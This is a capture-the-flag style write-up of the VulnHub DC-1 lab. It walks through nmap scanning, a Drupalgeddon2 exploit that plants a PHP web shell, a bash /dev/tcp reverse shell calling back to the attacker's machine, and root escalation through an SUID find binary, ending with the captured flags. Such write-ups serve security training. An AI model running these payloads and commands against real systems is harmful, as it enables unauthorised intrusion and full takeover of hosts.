---
layout: post
author: H4
---
# PG VULNHUB DC-1
[Details](https://www.vulnhub.com/entry/dc-1,292/)

## enumeration

Performing a `nmap` scan to identify the attack surface of the target.

### nmap
```bash
nmap 192.168.200.193       
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-27 13:38 EDT
Nmap scan report for 192.168.200.193
Host is up (0.058s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
111/tcp open  rpcbind

Nmap done: 1 IP address (1 host up) scanned in 1.50 seconds
```

### web server (port 80)
- `gobuster` did not reveal anything useful on the web server on port `80`
- website with drupal installation  
-> maybe vulnerable to `druaplgeddon`

---

## exploitation
### durpalgeddon2
```bash
git clone https://github.com/dreadlocked/Drupalgeddon2.git
```

```bash
ruby drupalgeddon2.rb http://192.168.200.193/
[*] --==[::#Drupalggedon2::]==--
--------------------------------------------------------------------------------
[i] Target : http://192.168.200.193/
--------------------------------------------------------------------------------
[!] MISSING: http://192.168.200.193/CHANGELOG.txt    (HTTP Response: 404)
[!] MISSING: http://192.168.200.193/core/CHANGELOG.txt    (HTTP Response: 404)
[+] Found  : http://192.168.200.193/includes/bootstrap.inc    (HTTP Response: 403)
[+] Header : v7 [X-Generator]
[!] MISSING: http://192.168.200.193/core/includes/bootstrap.inc    (HTTP Response: 404)
[!] MISSING: http://192.168.200.193/includes/database.inc    (HTTP Response: 403)
[+] Found  : http://192.168.200.193/    (HTTP Response: 200)
[+] Metatag: v7.x [Generator]
[!] MISSING: http://192.168.200.193/    (HTTP Response: 200)
[+] Drupal?: v7.x
--------------------------------------------------------------------------------
[*] Testing: Form   (user/password)
[+] Result : Form valid
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Clean URLs
[+] Result : Clean URLs enabled
--------------------------------------------------------------------------------
[*] Testing: Code Execution   (Method: name)
[i] Payload: echo OZFKXPOT
[+] Result : OZFKXPOT
[+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!
--------------------------------------------------------------------------------
[*] Testing: Existing file   (http://192.168.200.193/shell.php)
[i] Response: HTTP 404 // Size: 13
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Writing To Web Root   (./)
[i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee shell.php
[+] Result : <?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); }
[+] Very Good News Everyone! Wrote to the web root! Waayheeeey!!!
--------------------------------------------------------------------------------
[i] Fake PHP shell:   curl 'http://192.168.200.193/shell.php' -d 'c=hostname'
DC-1>> whoami
www-data
```

Yay! RCE works!

---

## post exploitation
### full reverse shell
`drupalgeddon` deploys a simple `shell.php` and we will exploit this to get a cute reverse shell.

#### listener on attacker machine
```bash
nc -lvp 80
listening on [any] 80 ...
```

#### on target machine
payload: `bash -c 'bash -i >& /dev/tcp/192.168.49.200/80 0>&1'`
```http
GET /shell.php?c=bash+-c+'bash+-i+>%26+/dev/tcp/192.168.49.200/80+0>%261' HTTP/1.1
Host: 192.168.200.193
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: has_js=1
Connection: close
```

#### catch reverse connection
```bash
nc -lvp 80
listening on [any] 80 ...
192.168.200.193: inverse host lookup failed: Unknown host
connect to [192.168.49.200] from (UNKNOWN) [192.168.200.193] 45807
bash: no job control in this shell
www-data@DC-1:/var/www$ whoami
whoami
www-data
```

#### make it beautiful
```bash
www-data@DC-1:/var/www$ python -c 'import pty;pty.spawn("/bin/bash")'
python -c 'import pty;pty.spawn("/bin/bash")'
www-data@DC-1:/var/www$ export TERM=xterm
export TERM=xterm
```

hit CTRL+Z
```bash
www-data@DC-1:/var/www$ ^Z
zsh: suspended  nc -lvp 80
stty raw -echo; fg                                                                 
[1]  + continued  nc -lvp 80

www-data@DC-1:/var/www$ whoami 
www-data
```
Now we got a fully interactive shell with autocomplete etc. :)

### first flag
```bash
www-data@DC-1:/var/www$ cd /
www-data@DC-1:/$ cd home
www-data@DC-1:/home$ ls
flag4  local.txt
www-data@DC-1:/home$ cat local.txt
7******************************8
```
-> `7******************************8`

### privilege escalation
#### check for suid binaries
```bash
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
-rwsr-xr-x 1 root root 88744 Dec 10  2012 /bin/mount
-rwsr-xr-x 1 root root 31104 Apr 13  2011 /bin/ping
-rwsr-xr-x 1 root root 35200 Feb 27  2017 /bin/su
-rwsr-xr-x 1 root root 35252 Apr 13  2011 /bin/ping6
-rwsr-xr-x 1 root root 67704 Dec 10  2012 /bin/umount
-rwxr-sr-x 1 root ssh 128396 Jan 27  2018 /usr/bin/ssh-agent
-rwsr-sr-x 1 daemon daemon 50652 Oct  4  2014 /usr/bin/at
-rwxr-sr-x 1 root mlocate 30492 Sep 25  2010 /usr/bin/mlocate
-rwxr-sr-x 1 root mail 17908 Nov 18  2017 /usr/bin/lockfile
-rwsr-xr-x 1 root root 35892 Feb 27  2017 /usr/bin/chsh
-rwxr-sr-x 1 root shadow 49364 Feb 27  2017 /usr/bin/chage
-rwxr-sr-x 1 root tty 9708 Jun 11  2012 /usr/bin/bsd-write
-rwsr-xr-x 1 root root 45396 Feb 27  2017 /usr/bin/passwd
-rwsr-xr-x 1 root root 30880 Feb 27  2017 /usr/bin/newgrp
-rwsr-xr-x 1 root root 44564 Feb 27  2017 /usr/bin/chfn
-rwxr-sr-x 1 root mail 9768 Nov 30  2014 /usr/bin/mutt_dotlock
-rwxr-sr-x 1 root tty 18020 Dec 10  2012 /usr/bin/wall
-rwxr-sr-x 1 root crontab 34760 Jul  4  2012 /usr/bin/crontab
-rwxr-sr-x 1 root shadow 18168 Feb 27  2017 /usr/bin/expiry
-rwsr-xr-x 1 root root 66196 Feb 27  2017 /usr/bin/gpasswd
-rwsr-sr-x 1 root mail 83912 Nov 18  2017 /usr/bin/procmail
-rwsr-xr-x 1 root root 162424 Jan  6  2012 /usr/bin/find
-rwxr-sr-x 1 root mail 13960 Dec 12  2012 /usr/bin/dotlockfile
-rwsr-xr-x 1 root root 937564 Feb 11  2018 /usr/sbin/exim4
-rwsr-xr-x 1 root root 9660 Jun 20  2017 /usr/lib/pt_chown
-rwsr-xr-x 1 root root 248036 Jan 27  2018 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 5412 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-- 1 root messagebus 321692 Feb 10  2015 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwxr-sr-x 1 root utmp 4972 Feb 21  2011 /usr/lib/utempter/utempter
-rwxr-sr-x 1 root shadow 30332 May  5  2012 /sbin/unix_chkpwd
-rwsr-xr-x 1 root root 84532 May 22  2013 /sbin/mount.nfs
```
-> `find` looks juicy!  
  
Check [gtfobins](https://gtfobins.github.io/) on how to exploit `find` to gain `root` access.

```bash
www-data@DC-1:/home$ whereis find
find: /usr/bin/find /usr/bin/X11/find /usr/share/man/man1/find.1.gz
www-data@DC-1:/home$ find . -exec /bin/sh \; -quit    
# whoami
root
```

### second flag
```bash
# cd /root
# ls
proof.txt  thefinalflag.txt
# cat proof.txt
0******************************1
```
-> `0******************************1`  
  
Pwned! <@:-)
